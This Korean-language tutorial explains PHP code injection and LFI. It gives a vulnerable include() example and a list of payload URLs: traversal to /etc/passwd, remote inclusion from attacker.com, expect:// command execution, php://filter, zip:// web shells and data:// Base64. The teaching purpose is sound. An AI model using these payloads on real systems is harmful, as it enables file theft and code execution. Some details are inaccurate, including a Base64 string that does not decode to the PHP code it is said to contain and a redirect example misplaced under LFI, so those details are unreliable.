```
코드(Code) 인젝션서버의 PHP 코드 실행 과정에 공격자의 코드를 삽입시키는 위협으로 가장 많은 공격은 서버에서 수행 코드를 내포시키는 include(), include_once(), require(), require_once() 함수들을 대상으로 해서 자신의 코드가 실행 과정에 반영되도록 하는 것입니다. include ($_GET['id'].".php");위의 사례처럼 웹 입력 자료를 기반으로 이들 함수를 사용한다면 철저한 사전 검사를 해야 합니다. 또다른 코드 인젝션의 위험성은 eval() 함수 사용입니다. eval() 함수로 PHP 코드를 문자열로 전달하면 그대로 수행하기 때문에 eval() 함수 파라미터가 혹여라도 웹 입력과 연관성이 있다면 철저한 사전 검사를 반드시 수행해야 합니다.
```

### **LFI (Local File Inclusion) 취약점이란?**

**LFI (Local File Inclusion)** 취약점은 웹 애플리케이션이 사용자가 입력한 값을 처리할 때, 그 입력값을 **파일 경로로 해석**하여 서버의 파일을 읽도록 할 수 있는 취약점입니다. 주로 **PHP**에서 발생하며, 공격자는 서버의 로컬 파일을 포함시켜서 **비밀번호 파일**, **구성 파일**, 또는 심지어 **시스템 파일**에 접근할 수 있게 됩니다.

이 취약점이 발생하는 주된 이유는 사용자가 **파일 경로**를 입력하도록 하는 기능이 제대로 필터링되지 않거나, **입력값 검증**이 부족할 때입니다.

### **LFI 취약점이 발생하는 예시**

```php
<?php
  // 예시 코드
  $page = $_GET['page'];  // 사용자가 입력한 'page' 값
  include($page);         // 사용자가 지정한 파일을 포함
?>
```

위 코드에서 `$_GET['page']`는 사용자가 입력하는 **파일 경로**입니다. 예를 들어, 사용자가 `page=about.php`와 같이 요청을 보내면 `about.php` 파일이 포함됩니다. 문제는, 이 값이 **검증되지 않고** 바로 파일 경로로 처리되기 때문에 **악의적인 사용자가** 이를 이용하여 서버의 중요한 파일을 포함시킬 수 있습니다.

### **LFI 취약점의 악용 예시**

사용자가 URL에서 `page` 파라미터를 이용하여 다른 파일을 포함시키도록 할 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?page=../../../../etc/passwd
```

위의 예에서 `../../../../etc/passwd`는 **상위 디렉터리로 이동하여** 시스템의 중요한 파일인 **`/etc/passwd`** 파일을 포함하려는 시도입니다. `/etc/passwd` 파일은 리눅스 시스템에서 사용자 계정 정보가 담겨 있는 파일로, 이를 포함하면 공격자는 시스템에 대한 중요한 정보를 얻을 수 있습니다.

---

### **LFI 취약점의 페이로드 예시**

#### 1. **상위 디렉터리로 이동하여 민감한 파일 읽기**

```http
http://example.com/vulnerable.php?page=../../../../etc/passwd
```

* 위 URL은 시스템의 중요한 **`/etc/passwd`** 파일을 포함시키려는 시도입니다.

#### 2. **`file://`을 사용하여 로컬 파일 읽기**

```http
http://example.com/vulnerable.php?page=file:///etc/hosts
```

* `file://`을 사용하여 시스템의 **`/etc/hosts`** 파일을 포함할 수 있습니다. 이 파일은 시스템의 호스트 이름 및 IP 주소 정보를 담고 있습니다.

#### 3. **외부 웹 페이지의 파일 포함 (HTTP URL 사용)**

```http
http://example.com/vulnerable.php?page=http://attacker.com/malicious.php
```
* 참고 : 파일을 포함하지 않고 다른 페이지로의 리다이렉션을 원할 때는 다음과 같다.
```
https://example.com/school/?group=window.location=”https://maliciouswebsite.com”
```

* `http://`을 사용하여 **외부 서버**에서 악성 파일을 포함시킬 수 있습니다. 이 방법은 \*\*원격 파일 포함 (RFI)\*\*과 유사합니다.

#### 4. **PHP 코드 인젝션 (Wrapper + Base64)**

```http
http://example.com/vulnerable.php?page=data://text/plain;base64,PD9waHAgZWNobyAnSGVsbG8gd29ybGQnOyBmaW5hbCgpOyA/Pg==
```

* `data://` 프로토콜과 Base64 인코딩을 이용하여 PHP 코드를 직접 포함할 수 있습니다. 위 예시에서 `PD9waHAgZWNobyAnSGVsbG8gd29ybGQnOyBmaW5hbCgpOyA/Pg==`는 `<?php echo 'Hello world'; ?>`라는 PHP 코드를 Base64로 인코딩한 것입니다.

---


### **Wrapper를 이용한 LFI 취약점 악용**

PHP에서는 **Wrapper**를 이용하여 **파일 읽기** 외에도 다른 기능을 수행할 수 있습니다. Wrapper는 파일 경로 앞에 붙여서 특정 프로토콜이나 방법을 지정하는 방식입니다.

#### **일반적인 PHP Wrapper**

* expect//: system command를 실행시켜 준다
```
  ?page_num=expect://ls
```

* php://filter: encode / decode 옵션으로 서버 안에 존재하는 문서를 열람할 수 있다.
```
?page_num=php://filter/convert.base64-encode/resource=[목적 파일]       (base64로 인코딩하여 확인)
```

* zip://: zip파일의 압축을 풀고 해당파일을 실행한다(웹쉘 응용)
```
?page_num=zip://file.zip#web_shell.php
```

---

#### **그 외 PHP Wrapper**
* `file://`: 로컬 파일 시스템에서 파일을 읽을 때 사용
* `http://`: 외부 HTTP URL을 통해 파일을 읽을 때 사용
* `ftp://`: FTP 서버에서 파일을 읽을 때 사용
* `data://`: 임베디드 데이터 URL을 통해 파일을 읽을 때 사용

이러한 Wrapper를 이용하면, LFI 취약점을 악용하여 **로컬 시스템 파일**뿐만 아니라 **원격 서버의 파일**을 포함시키는 방식으로 공격할 수 있습니다.

### **Wrapper를 이용한 LFI 공격 예시**

#### 1. **file://을 이용한 LFI**

`file://` 프로토콜을 사용하여 로컬 파일을 읽을 수 있습니다. 예를 들어:

```
http://example.com/vulnerable.php?page=file:///etc/passwd
```

위 URL에서는 `file:///etc/passwd`를 사용하여 `/etc/passwd` 파일을 포함시키려고 시도합니다.

#### 2. **[http://을](http://을) 이용한 원격 파일 포함 (RFI와 비슷한 방식)**

`http://`를 사용하면 원격 서버의 파일을 포함시킬 수 있습니다. 이를 이용하면 **원격 파일 포함**(RFI, Remote File Inclusion)처럼 작동할 수 있습니다.

```
http://example.com/vulnerable.php?page=http://attacker.com/malicious_file.php
```

이 공격에서는 원격 서버(`attacker.com`)의 악성 PHP 파일을 포함시켜서 원격 서버에서 실행되는 코드를 서버에 삽입할 수 있습니다.

#### 3. **data://을 이용한 인코딩된 코드 포함**

`data://`를 사용하면 **Base64로 인코딩된 파일**을 포함할 수 있습니다. 예를 들어:

```
http://example.com/vulnerable.php?page=data:text/plain;base64,SGVsbG8gd29ybGQ=
```

위 URL에서 `SGVsbG8gd29ybGQ=`는 "Hello world"를 Base64로 인코딩한 값입니다. 이는 PHP 코드로 실행될 수 있는 형식으로 변환될 수 있습니다.
